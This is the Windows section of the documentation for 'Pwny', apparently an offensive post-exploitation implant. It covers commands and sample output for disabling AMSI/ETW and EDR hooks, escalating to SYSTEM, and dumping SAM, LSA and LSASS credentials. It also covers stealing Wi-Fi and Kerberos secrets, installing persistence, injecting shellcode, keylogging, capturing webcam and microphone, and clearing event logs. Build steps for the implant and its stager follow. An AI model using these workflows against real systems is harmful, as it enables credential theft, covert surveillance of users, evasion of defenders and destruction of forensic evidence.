# Windows — Pwny Documentation

This section covers everything specific to running Pwny on **Windows** targets: platform-specific commands, the extensive plugin library (28 plugins), building, evasion, and post-exploitation workflows.

---

## Table of Contents

- [Windows-Specific Commands](#windows-specific-commands)
- [Plugins Overview](#plugins-overview)
- [Plugin Reference](#plugin-reference)
  - [Evasion & Defense](#evasion--defense)
  - [Privilege Escalation](#privilege-escalation)
  - [Credential Harvesting](#credential-harvesting)
  - [Persistence](#persistence)
  - [Process & Injection](#process--injection)
  - [System Reconnaissance](#system-reconnaissance)
  - [Lateral Movement](#lateral-movement)
  - [Network Capture](#network-capture)
  - [Media Capture](#media-capture)
  - [Execution](#execution)
  - [Forensic Manipulation](#forensic-manipulation)
- [Building for Windows](#building-for-windows)
- [Windows Build Artifacts](#windows-build-artifacts)
- [COT on Windows](#cot-on-windows)

---

## Windows-Specific Commands

These commands are only available on Windows targets:

### `getuid`

Get the current effective user identity, reflecting any impersonation.

```
pwny:/C/Users/target$ getuid
[i] DESKTOP-ABC\Administrator
```

After token impersonation (via `steal_token`), `getuid` shows the impersonated identity while `whoami` may still show the original.

---

## Plugins Overview

Windows has the richest plugin library. All plugins are loaded as **COT blobs** (module-stomped into signed DLLs) for maximum stealth.

Load a plugin:
```
pwny:/$ load <plugin_name>
```

After loading, run `help` to see the new commands.

| Plugin | Commands Added | Category |
|--------|---------------|----------|
| **evasion** | `evasion`, `unhook` | Evasion |
| **getsystem** | `getsystem` | Escalation |
| **token** | `steal_token`, `make_token`, `rev2self` | Escalation |
| **uac** | `uac` | Escalation |
| **credentials** | `hashdump`, `lsa_secrets`, `dpapi` | Credentials |
| **credstore** | `credstore` | Credentials |
| **kerberos** | `kerberos` | Credentials |
| **wifi_passwords** | `wifi` | Credentials |
| **persist** | `persist` | Persistence |
| **schtasks** | `schtask_list`, `schtask_create`, `schtask_run`, `schtask_delete` | Persistence |
| **inject** | `inject`, `migrate`, `ppid_spoof` | Injection |
| **services** | `services`, `av` | Recon |
| **sysinfo** | `apps`, `hotfix` | Recon |
| **arp** | `arp` | Recon |
| **netshare** | `net_enum` | Recon |
| **registry** | `registry` | Recon |
| **smb_pipe** | `pipe` | Lateral |
| **media** | `cam`, `mic` | Media |
| **ui** | `screen`, `uictl`, `keyscan` | Media |
| **clipboard** | `clipboard` | Media |
| **execute** | `powershell`, `execute_assembly`, `bof` | Execution |
| **forge** | `forge`, `memread`, `memwrite` | Execution |
| **eventlog** | `clearev` | Forensic |
| **timestomp** | `timestomp` | Forensic |
| **minidump** | `minidump` | Credentials |
| **lsadump** | `lsadump` | Credentials |
| **sniffer** | `sniffer` | Network |

---

## Plugin Reference

### Evasion & Defense

#### `evasion` — AMSI/ETW Patching & DLL Unhooking

Patches anti-malware interfaces and removes EDR hooks. Loading this plugin provides two commands: `evasion` and `unhook`.

```
pwny:/$ load evasion
```

**Patch AMSI (disable script scanning):**
```
pwny:/$ evasion -a
[*] Patching AmsiScanBuffer...
[+] AMSI patched — AmsiScanBuffer neutralized.
```

**Patch ETW (disable event tracing):**
```
pwny:/$ evasion -e
[*] Patching EtwEventWrite...
[+] ETW patched — EtwEventWrite neutralized.
```

**Patch both at once:**
```
pwny:/$ evasion -A
[*] Patching AMSI and ETW...
[+] AMSI and ETW patched successfully.
```

**Unhook ntdll.dll (remove EDR hooks):**
```
pwny:/$ unhook -n
[*] Restoring ntdll.dll from disk...
[+] Unhooked ntdll.dll — restored 47 bytes of .text
```

**Unhook all common DLLs:**
```
pwny:/$ unhook -a
[*] Restoring ntdll.dll, kernel32.dll, kernelbase.dll...
```

**Unhook a specific DLL:**
```
pwny:/$ unhook -d kernel32.dll
[*] Restoring kernel32.dll from disk...
[+] Unhooked kernel32.dll — restored 12 bytes of .text
```

---

### Privilege Escalation

#### `getsystem` — Elevate to SYSTEM

Attempt to elevate from Administrator to `NT AUTHORITY\SYSTEM`.

```
pwny:/$ load getsystem
```

**Token duplication (default):**
```
pwny:/$ getsystem
[*] Attempting privilege escalation via Token Duplication...
[+] Got SYSTEM!
```

**Named pipe technique:**
```
pwny:/$ getsystem -t 1
[*] Attempting privilege escalation via Named Pipe Impersonation...
[+] Got SYSTEM!
```

| Technique | ID | Description |
|-----------|:--:|-------------|
| Token duplication | 0 | Duplicate SYSTEM token from a SYSTEM process |
| Named pipe | 1 | Create a named pipe, trick SYSTEM service into connecting |

---

#### `token` — Token Impersonation

Steal tokens from processes, create logon tokens, and revert.

```
pwny:/$ load token
```

**Steal a token from a process:**
```
pwny:/$ steal_token 648
[*] Stealing token from PID 648...
[+] Now impersonating: NT AUTHORITY\SYSTEM
```

**Create a logon token from credentials:**
```
pwny:/$ make_token -d CORP -u admin -p P@ssw0rd
[*] Creating logon token for CORP\admin...
[+] Now impersonating: CORP\admin
[i] Use 'rev2self' to revert to original identity.
```

**Revert to original token:**
```
pwny:/$ rev2self
[+] Reverted to original process token.
```

---

#### `uac` — UAC Information

Check elevation status and token integrity level.

```
pwny:/$ load uac
```

```
pwny:/$ uac -i
[i] Elevated: No
[i] Integrity: Medium
```

When elevated:
```
pwny:/$ uac -i
[i] Elevated: Yes
[i] Integrity: High
```

---

### Credential Harvesting

#### `credentials` — SAM Hashdump, LSA Secrets, DPAPI

Comprehensive credential extraction.

```
pwny:/$ load credentials
```

**Dump SAM hashes (requires SYSTEM):**
```
pwny:/$ hashdump -d
[*] Dumping SAM and SYSTEM hives...
[+] Retrieved SAM (32768 bytes) and SYSTEM (262144 bytes) hives.
[i] Administrator:500:aad3b435...:31d6cfe0...:::
[i] Guest:501:aad3b435...:31d6cfe0...:::
[i] user1:1001:aad3b435...:e52cac67...:::
```

Save raw hives for offline processing:
```
pwny:/$ hashdump -r /tmp/hives/
[+] Saved SAM to /tmp/hives/SAM
[+] Saved SYSTEM to /tmp/hives/SYSTEM
[i] Use --raw to save hives and process offline with secretsdump.py or samdump2.
```

**Dump LSA secrets:**
```
pwny:/$ lsa_secrets -d
LSA Secrets
===========

 Secret Name              Data (hex)
 -----------              ----------
 DefaultPassword          50004000730073...
 DPAPI_SYSTEM             01000000d08c9d...
```

**DPAPI decryption:**
```
pwny:/$ lsa_secrets -D <encrypted_blob_path> -o /tmp/decrypted.bin
[i] Decrypted data saved to /tmp/decrypted.bin (256 bytes).
```

---

#### `credstore` — Windows Credential Manager

Enumerate saved credentials from Windows Credential Manager.

```
pwny:/$ load credstore
```

```
pwny:/$ credstore -l
Credentials
===========

 Target                       Type      Username        Password      Comment
 ------                       ----      --------        --------      -------
 Domain:target=server1        Domain    CORP\admin      P@ssw0rd      -
 WindowsLive:target=...       Generic   user@live.com   ********      Microsoft account
```

---

#### `kerberos` — Kerberos Ticket Management

List, dump, and purge Kerberos tickets from the current logon session.

```
pwny:/$ load kerberos
```

The `kerberos` command provides three operations via flags: `-l` (list), `-d` (dump), `-p` (purge).

**List tickets:**
```
pwny:/$ kerberos -l
Kerberos Tickets
================

 Client              Server                  Realm       Encryption  Flags  Start               End                 Renew
 ------              ------                  -----       ----------  -----  -----               ---                 -----
 admin@CORP.LOCAL    krbtgt/CORP.LOCAL       CORP.LOCAL  AES256-CTS  TGT    2026-03-17 14:22    2026-03-18 02:22    2026-03-24 14:22
 admin@CORP.LOCAL    cifs/DC01.CORP.LOCAL    CORP.LOCAL  AES256-CTS  0      2026-03-17 14:22    2026-03-18 02:22    -
```

**Dump a ticket:**
```
pwny:/$ kerberos -d krbtgt/CORP.LOCAL -o /tmp/ticket.kirbi
[i] Ticket saved to /tmp/ticket.kirbi (1247 bytes).
```

**Purge all tickets:**
```
pwny:/$ kerberos -p
[+] Ticket cache purged successfully.
```

---

#### `wifi_passwords` — WiFi Profile Extraction

Extract saved WiFi passwords from all configured profiles.

```
pwny:/$ load wifi_passwords
```

```
pwny:/$ wifi -l
[*] Enumerating WiFi profiles...

WiFi Profiles
=============

 SSID             Password      Auth              Encryption
 ----             --------      ----              ----------
 CorpWiFi         SecretKey123  WPA2-Personal     CCMP
 GuestNetwork     guest2026     WPA2-Personal     CCMP
 HomeRouter       MyP@ss!       WPA2-Personal     CCMP
```

**Filter by SSID:**
```
pwny:/$ wifi -f Corp
```

---

#### `minidump` — Process Memory Dump

Create memory dumps of processes (useful for dumping lsass.exe credentials).

```
pwny:/$ load minidump
```

```
pwny:/$ minidump 648
[*] Creating memory dump of PID 648...
[+] Dump saved to /home/user/.pwny/lsass_648.dmp (36175872 bytes)
[i] Use mimikatz or pypykatz to extract credentials:
[i]   pypykatz lsa minidump /home/user/.pwny/lsass_648.dmp
```

**Save to custom local path:**
```
pwny:/$ minidump 648 -o /tmp/dump.dmp
[*] Creating memory dump of PID 648...
[+] Dump saved to /tmp/dump.dmp (36175872 bytes)
```

**Save to remote path (avoid large transfer):**
```
pwny:/$ minidump 648 -r C:\Windows\Temp\dump.dmp
[*] Creating memory dump of PID 648...
[+] Dump saved to remote path: C:\Windows\Temp\dump.dmp (36175872 bytes)
```

---

#### `lsadump` — Stealthy LSASS Memory Dump

Dump LSASS process memory using indirect syscalls. Unlike `minidump`, this plugin avoids standard API calls that EDRs hook (`OpenProcess`, `ReadProcessMemory`) by dispatching through raw `syscall` instructions extracted from ntdll stubs.

```
pwny:/$ load lsadump
```

```
pwny:/$ lsadump -o /tmp/lsass.dmp
[*] Resolving syscall stubs from ntdll.dll...
[*] Locating lsass.exe...
[*] Reading LSASS memory via indirect syscalls...
[+] LSASS dump saved to /tmp/lsass.dmp (42516480 bytes)
[i] Use pypykatz to extract credentials:
[i]   pypykatz lsa minidump /tmp/lsass.dmp
```

**Key features:**
- Indirect syscalls via ntdll stub trampolines (bypasses userland hooks)
- No `OpenProcess` / `NtReadVirtualMemory` in the IAT
- Graceful failure under Wine (detects `wine_*` exports in ntdll)
- Requires SYSTEM or SeDebugPrivilege

> **Note:** This plugin uses the same dump format as `minidump`, so the output can be processed with mimikatz, pypykatz, or secretsdump.py.

---

### Persistence

#### `persist` — Persistence Mechanisms

Install, remove, and list persistence across multiple techniques. Techniques are identified by numeric ID.

```
pwny:/$ load persist
```

**Install via HKCU Run key (user-level):**
```
pwny:/$ persist -i 1 -n MyApp -c "C:\Windows\Temp\payload.exe"
[*] Installing persistence via HKCU Run Key: MyApp...
[+] Persistence installed via HKCU Run Key.
```

**Install via HKLM Run key (requires admin):**
```
pwny:/$ persist -i 2 -n MyApp -c "C:\Windows\Temp\payload.exe"
[*] Installing persistence via HKLM Run Key: MyApp...
[+] Persistence installed via HKLM Run Key.
```

**Install via Scheduled Task:**
```
pwny:/$ persist -i 3 -n MyTask -c "C:\Windows\Temp\payload.exe"
[*] Installing persistence via Scheduled Task: MyTask...
[+] Persistence installed via Scheduled Task.
```

**Deploy as Windows Service (auto-builds service binary):**
```
pwny:/$ persist -i 4 -d -n PwnySvc -u tcp://192.168.1.10:8888
[*] Building service binary for x86_64-w64-mingw32...
[*] Uploading service binary (245760 bytes) to C:\Windows\Temp\PwnySvc.exe...
[*] Registering service 'PwnySvc' -> C:\Windows\Temp\PwnySvc.exe...
[+] Service 'PwnySvc' deployed and registered successfully!
```

| Technique | ID | Requires Admin |
|-----------|:--:|:--------------:|
| HKCU Run Key | 1 | No |
| HKLM Run Key | 2 | Yes |
| Scheduled Task | 3 | Depends |
| Windows Service | 4 | Yes |

**List installed persistence:**
```
pwny:/$ persist -l
Persistence Entries
===================

 Type            Name     Command
 ----            ----     -------
 HKCU Run Key    MyApp    C:\Windows\Temp\payload.exe
```

**Remove persistence:**
```
pwny:/$ persist -r 1 -n MyApp
[*] Removing persistence: MyApp...
[+] Persistence entry 'MyApp' removed.
```

---

#### `schtasks` — Scheduled Tasks Management

Full scheduled task management via COM interfaces. Loading this plugin provides four commands: `schtask_list`, `schtask_create`, `schtask_run`, and `schtask_delete`.

```
pwny:/$ load schtasks
```

**List tasks:**
```
pwny:/$ schtask_list
Scheduled Tasks
===============

 Name             Path          State
 ----             ----          -----
 GoogleUpdate     \             Ready
 OneDrive Sync    \Microsoft\   Running
```

**List tasks in a specific folder:**
```
pwny:/$ schtask_list -f \Microsoft\Windows\
```

**Create a task:**
```
pwny:/$ schtask_create SystemUpdate -c "C:\Windows\Temp\payload.exe"
[+] Task 'SystemUpdate' created.
```

**Create a task from XML definition:**
```
pwny:/$ schtask_create SystemUpdate -x /path/to/task.xml
```

**Run a task immediately:**
```
pwny:/$ schtask_run SystemUpdate
[+] Task 'SystemUpdate' triggered.
```

**Delete a task:**
```
pwny:/$ schtask_delete SystemUpdate
[+] Task 'SystemUpdate' deleted.
```

---

### Process & Injection

#### `inject` — Process Injection & Migration

Inject shellcode, migrate to another process, or spawn with PPID spoofing.

```
pwny:/$ load inject
```

**Migrate to another process:**
```
pwny:/$ migrate 1024
[*] Migrating from PID 3412 to PID 1024 [Thread Hijack (stealthy)]...
[*] Injecting DLL (245760 bytes)...
[*] Migration initiated, reconnecting...
[+] Successfully migrated to PID 1024!
```

**Migrate with specific technique:**
```
pwny:/$ migrate 1024 -t 0
```

| Technique | ID | Description |
|-----------|:--:|-------------|
| CreateRemoteThread | 0 | CRT (noisy) |
| QueueUserAPC | 1 | APC injection (moderate) |
| Thread Hijack | 2 | Thread hijacking (stealthy, default) |
| Process Hollow | 3 | Process hollowing (stealthiest) |

**Inject raw shellcode:**
```
pwny:/$ inject 1024 -f /path/to/shellcode.bin
[*] Injecting 512 bytes into PID 1024 [Thread Hijack (stealthy)]...
[+] Shellcode injected and executing in PID 1024.
```

**Spawn a process with PPID spoofing:**
```
pwny:/$ ppid_spoof -p 648 -c "C:\Windows\System32\notepad.exe"
[*] Spawning 'C:\Windows\System32\notepad.exe' under parent PID 648...
[+] Process spawned (PID 5120) under parent 648.
```

---

### System Reconnaissance

#### `services` — Service Enumeration & AV Detection

List Windows services and detect installed AV/EDR products.

```
pwny:/$ load services
```

```
pwny:/$ services -l
Services
========

 Name                    Display Name                    State    PID
 ----                    ------------                    -----    ---
 WinDefend               Windows Defender Service         Running  2048
 Sense                   Windows Defender ATP             Running  3072
 EventLog                Windows Event Log                Running  1024
 ...
```

To detect installed AV/EDR products, use the separate `av` command:
```
pwny:/$ av -l
[i] Windows Defender
[i]   WinDefend (Windows Defender Service) [Running]
[i]   Sense (Windows Defender ATP) [Running]
```

The `av` command automatically fingerprints known AV/EDR products including:
Windows Defender, Norton, McAfee, Kaspersky, Bitdefender, ESET, Avast/AVG, Trend Micro, Sophos, CrowdStrike, SentinelOne, Carbon Black, Cylance, and more.

---

#### `sysinfo` (plugin) — Installed Apps & Hotfixes

Enumerate installed applications and Windows updates.

```
pwny:/$ load sysinfo
```

**List installed applications:**
```
pwny:/$ apps -l
[*] Enumerating installed applications...

Installed Applications (127)
============================

 Name                         Version    Vendor              Install Date
 ----                         -------    ------              ------------
 Google Chrome                120.0.0    Google LLC           2026-01-15
 Microsoft Office             16.0       Microsoft Corp       2025-12-01
 7-Zip                        23.01      Igor Pavlov          2026-02-20
 ...
```

**Filter by name or vendor:**
```
pwny:/$ apps -f Chrome
pwny:/$ apps -v Microsoft
```

**List hotfixes:**
```
pwny:/$ hotfix -l
[*] Enumerating installed hotfixes...

Installed Hotfixes (23)
=======================

 KB ID         Package
 -----         -------
 KB5034441     Package_for_RollupFix~amd64
 KB5033372     Package_for_RollupFix~amd64
```

---

#### `arp` — ARP Table

Enumerate the system's ARP cache.

```
pwny:/$ load arp
```

```
pwny:/$ arp -l
ARP Table
=========

 IP Address       MAC Address        Type     Interface
 ----------       -----------        ----     ---------
 192.168.1.1      00:1a:2b:3c:4d:5e  Dynamic  3
 192.168.1.100    aa:bb:cc:dd:ee:ff  Dynamic  3
 224.0.0.22       01:00:5e:00:00:16  Static   3
```

---

### Network Capture

#### `sniffer` — Raw Socket Packet Capture

Capture network packets using Windows raw sockets with `SIO_RCVALL` (promiscuous mode). Packets are buffered in a ring buffer and can be dumped to standard PCAP format for analysis in Wireshark or tcpdump.

```
pwny:/$ load sniffer
```

**List network interfaces:**
```
pwny:/$ sniffer -l
[*] Querying network interfaces...

Network Interfaces
==================

 Index  IP Address       Netmask
 -----  ----------       -------
 3      192.168.1.50     255.255.255.0
 1      127.0.0.1        255.0.0.0
```

**Start a capture:**
```
pwny:/$ sniffer -s 192.168.1.50
[*] Starting capture on 192.168.1.50...
[+] Capturing on 192.168.1.50.
```

**List active captures:**
```
pwny:/$ sniffer -L
Active Captures
===============

 Interface       Packets  Bytes
 ---------       -------  -----
 192.168.1.50    1247     892160
```

**Dump captured packets to PCAP:**
```
pwny:/$ sniffer -d 192.168.1.50 -o /tmp/capture.pcap
[+] Dumped 1247 packets to /tmp/capture.pcap
```

**Stop a capture:**
```
pwny:/$ sniffer -c 192.168.1.50
[*] Stopping capture on 192.168.1.50...
[+] Stopped. 1247 packets captured (892160 bytes).
```

**Capture a fixed number of packets:**
```
pwny:/$ sniffer -s 192.168.1.50 -n 100
[+] Capturing up to 100 packets on 192.168.1.50.
```

> **Note:** Requires administrator privileges. Windows raw sockets deliver IP-layer frames (no Ethernet header). The PCAP output uses `DLT_RAW` (link type 101), which Wireshark handles natively.

---

#### `registry` — Windows Registry

Read, write, and delete registry keys and values.

```
pwny:/$ load registry
```

**Read a registry value:**
```
pwny:/$ registry -r "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -k ProductName
[i] Type: REG_SZ
[i] Data: Windows 10 Pro
```

**Write a registry value:**
```
pwny:/$ registry -w "HKCU\Software\MyApp" -k Setting -v "enabled" -t REG_SZ
[+] Registry value written successfully!
```

**Delete a registry value:**
```
pwny:/$ registry -d "HKCU\Software\MyApp" -k Setting
[+] Registry value 'Setting' deleted!
```

Supported hives: `HKCR`, `HKCU`, `HKLM`, `HKU`, `HKCC` (and their full names like `HKEY_LOCAL_MACHINE`).

Supported types: `REG_SZ`, `REG_EXPAND_SZ`, `REG_BINARY`, `REG_DWORD`, `REG_QWORD`, `REG_MULTI_SZ`.

---

#### `netshare` — Network Shares & Sessions

Enumerate SMB network shares and active sessions.

```
pwny:/$ load netshare
```

**List shares:**
```
pwny:/$ net_enum -s
Network Shares
==============

 Name       Type           Path                    Remark
 ----       ----           ----                    ------
 C$         Special        C:\                     Default share
 ADMIN$     Special        C:\Windows              Remote Admin
 IPC$       IPC            -                       Remote IPC
 SharedDocs Disk           C:\Users\Public\Docs    Public documents
```

**List active sessions:**
```
pwny:/$ net_enum -S
Network Sessions
================

 Client          User            Active   Idle
 ------          ----            ------   ----
 192.168.1.100   CORP\admin      2h 15m   5m 30s
```

---

### Lateral Movement

#### `smb_pipe` — Named Pipe Communication

Create and connect to named pipes for lateral movement.

```
pwny:/$ load smb_pipe
```

**Create a named pipe server:**
```
pwny:/$ pipe create -n pwny_c2
[*] Creating named pipe \\.\pipe\pwny_c2 and waiting for connection...
[+] Pipe created and client connected (ID: 0)
```

**Connect to a remote pipe:**
```
pwny:/$ pipe connect -n pwny_c2 -H 192.168.1.100
[*] Connecting to \\192.168.1.100\pipe\pwny_c2...
[+] Connected (ID: 1)
```

**Read/Write:**
```
pwny:/$ pipe write -i 0 -d "hello"
[+] Wrote 5 bytes.
pwny:/$ pipe read -i 1
[+] Read 5 bytes:
hello
```

**List and close:**
```
pwny:/$ pipe list
Active Pipes
============

 ID  Path
 --  ----
 0   \\.\pipe\pwny_c2
 1   \\192.168.1.100\pipe\pwny_c2

pwny:/$ pipe close -i 0
[+] Pipe 0 closed.
```

---

### Media Capture

#### `ui` — Screenshots, Streaming, Input Control & Keylogging

Combined plugin for visual capture and input manipulation.

```
pwny:/$ load ui
```

**Take a screenshot:**
```
pwny:/$ screen -s -o /tmp/screenshot.bmp
[+] Screenshot saved to /tmp/screenshot.bmp!
```

**Stream the screen:**
```
pwny:/$ screen -S
[*] Streaming screen...
[i] Press Ctrl-C to stop.
```

**Disable/enable input devices:**
```
pwny:/$ uictl -d mouse
[+] Successfully disabled mouse.

pwny:/$ uictl -d keyboard
[+] Successfully disabled keyboard.

pwny:/$ uictl -e mouse
[+] Successfully enabled mouse.

pwny:/$ uictl -e keyboard
[+] Successfully enabled keyboard.
```

**Check input device status:**
```
pwny:/$ uictl -s mouse
[i] Mouse: enabled
```

**Keylogging:**
```
pwny:/$ keyscan start
[+] Keylogger started.

pwny:/$ keyscan dump
[*] Captured keystrokes:
Hello World<ENTER>password123<ENTER>

pwny:/$ keyscan stop
[+] Keylogger stopped.
```

---

#### `clipboard` — Clipboard Access

Read and write the Windows clipboard.

```
pwny:/$ load clipboard
```

```
pwny:/$ clipboard -g
[i] Copied text from notepad

pwny:/$ clipboard -s "replaced content"
[+] Clipboard set.
```

---

#### `media` — Camera & Microphone

Capture from camera and microphone devices.

```
pwny:/$ load media
```

**List cameras:**
```
pwny:/$ cam -l
Camera Devices
==============

 ID  Name
 --  ----
 0   Integrated Webcam
```

**Take a snapshot:**
```
pwny:/$ cam -s 0 -o /tmp/webcam.jpg
[+] Snapshot saved.
```

**Stream camera:**
```
pwny:/$ cam -S 0
```

**List microphones:**
```
pwny:/$ mic -l
```

**Record audio:**
```
pwny:/$ mic -S 0 -o /tmp/recording.wav
```

---

### Execution

#### `execute` — PowerShell, .NET Assembly & BOF

Run PowerShell commands, load .NET assemblies in-memory, and execute Beacon Object Files.

```
pwny:/$ load execute
```

**Execute PowerShell:**
```
pwny:/$ powershell "Get-Process | Select-Object -First 5"
[*] Executing PowerShell command...

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    123       8     4560      12340       0.14   1234   1 chrome
    ...
```

**Execute .NET assembly in-memory:**
```
pwny:/$ execute_assembly /path/to/Seatbelt.exe -a "-group=all"
[*] Loading .NET assembly (245760 bytes)...
[+] Assembly executed successfully.
```

**Execute a BOF (Beacon Object File):**
```
pwny:/$ bof /path/to/whoami.o
[*] Executing BOF (4096 bytes)...
[+] BOF executed successfully.
```

BOF arguments can be passed as hex or strings:
```
pwny:/$ bof /path/to/dir.o -s "C:\Users"
```

---

#### `forge` — Arbitrary Win32 API Calls

Call any Win32 API function directly from the console. Uses subcommand syntax.

```
pwny:/$ load forge
```

```
pwny:/$ forge call kernel32.dll GetCurrentProcessId
[*] Calling kernel32.dll!GetCurrentProcessId (0 args)...
[+] Return value: 0x0000000000000D54 (3412)
[i] GetLastError: 0
```

**With arguments:**
```
pwny:/$ forge call user32.dll MessageBoxA dword:0 str:Hello str:Title dword:0
[*] Calling user32.dll!MessageBoxA (4 args)...
[+] Return value: 0x0000000000000001 (1)
```

**Read memory:**
```
pwny:/$ forge memread 0x7FFE0000 64
[+] Read 64 bytes from 0x00007FFE00000000:
```

**Write memory:**
```
pwny:/$ forge memwrite 0x7FFE0000 90909090
[+] Wrote 4 bytes to 0x00007FFE00000000.
```

---

### Forensic Manipulation

#### `eventlog` — Event Log Management

List and clear Windows event logs to cover tracks.

```
pwny:/$ load eventlog
```

**List event logs:**
```
pwny:/$ clearev -l
Event Logs
==========

 Name                    Records
 ----                    -------
 Application             1,247
 Security                34,892
 System                  8,431
 Windows PowerShell      156
```

**Clear a specific log:**
```
pwny:/$ clearev -c Security
[*] Clearing event log: Security...
[+] Event log 'Security' cleared.
```

**Clear all standard logs:**
```
pwny:/$ clearev -a
[*] Clearing all standard event logs...
[+] All standard event logs cleared.
```

---

#### `timestomp` — File Timestamp Manipulation

View or modify file timestamps (Modified, Accessed, Created).

```
pwny:/$ load timestomp
```

**Get timestamps:**
```
pwny:/$ timestomp -g "C:\Windows\Temp\payload.exe"
[i] Timestamps for: C:\Windows\Temp\payload.exe
[i]   Modified : 2026-03-17 14:30:00
[i]   Accessed : 2026-03-17 14:30:00
[i]   Created  : 2026-03-17 14:30:00
```

**Set timestamps to match another file:**
```
pwny:/$ timestomp -s "C:\Windows\Temp\payload.exe" -r "C:\Windows\System32\calc.exe"
[*] Copying timestamps from C:\Windows\System32\calc.exe to C:\Windows\Temp\payload.exe...
[+] Timestamps modified successfully.
```

**Set specific timestamps:**
```
pwny:/$ timestomp -s "C:\Windows\Temp\payload.exe" \
    -m "2024-01-15 08:30:00" \
    -a "2024-01-15 08:30:00" \
    -c "2024-01-15 08:30:00"
[*] Modifying timestamps on C:\Windows\Temp\payload.exe...
[+] Timestamps modified successfully.
```

---

## Building for Windows

### Prerequisites

- MinGW-w64 cross-compiler
  - macOS: `brew install mingw-w64`
  - Ubuntu: `apt install gcc-mingw-w64-x86-64`

### Build Steps

```bash
# 1. Build dependencies
make TARGET=x86_64-w64-mingw32

# 2. Build implant only
cmake -DCMAKE_TOOLCHAIN_FILE=toolchain/cmake/x86_64-w64-mingw32.cmake \
      -DMAIN=ON -B build
cmake --build build

# 3. Build implant + all plugins (COT)
cmake -DCMAKE_TOOLCHAIN_FILE=toolchain/cmake/x86_64-w64-mingw32.cmake \
      -DMAIN=ON -DPLUGINS=ON -B build
cmake --build build
```

### Windows Build Artifacts

| File | Description |
|------|-------------|
| `build/main.exe` | Main implant executable (statically linked) |
| `build/pwny.dll` | Migration DLL with reflective loader + obfuscation stubs |
| `build/pwny_service.exe` | Windows service binary (for service-based persistence) |
| `build/plugins/*.dll` | Intermediate plugin DLLs (before COT conversion) |
| `pwny/tabs/windows/x64/*` | Final COT blobs (deployed for Python loader) |

### Windows-Specific CMake Targets

The Windows build includes additional targets:

- **`pwny_service`** — Service executable with embedded stager (`stager_x64.S`) for service-based C2
- **`pwny_dll`** — Migration DLL with:
  - `stager_x64.S` — Shellcode stager
  - `obfuscate_x64.S` — Memory obfuscation
  - `gate_x64.S` — Syscall gate

---

## COT on Windows

All 28 Windows plugins are built as COT (Code-Only Tabs). During the CMake build:

1. Each plugin is compiled as a DLL
2. `pe2cot.py` strips the PE into a raw code blob
3. The `.cot` blob is placed in `pwny/tabs/windows/x64/<plugin_name>`
4. At runtime, the Python loader sends the blob to the implant
5. The implant stomps it into a signed system DLL's memory

See [COT Documentation](../cot.md) for the full technical deep-dive.

### Adding a New COT Plugin

1. Create `plugins/myplugin/myplugin.c` with COT headers
2. Add `myplugin` to the `COT_PLUGINS` list in `CMakeLists.txt`
3. Create `pwny/plugins/windows/myplugin.py` with Python wrapper
4. Build with `-DPLUGINS=ON`

---

## See Also

- [Commands Reference](../commands.md) — cross-platform commands
- [Console Features](../console.md) — prompt, banners, environment
- [COT Documentation](../cot.md) — module stomping deep-dive
- [Plugin Development](../plugin-development.md) — writing your own plugins
- [Building Guide](../building.md) — full build instructions
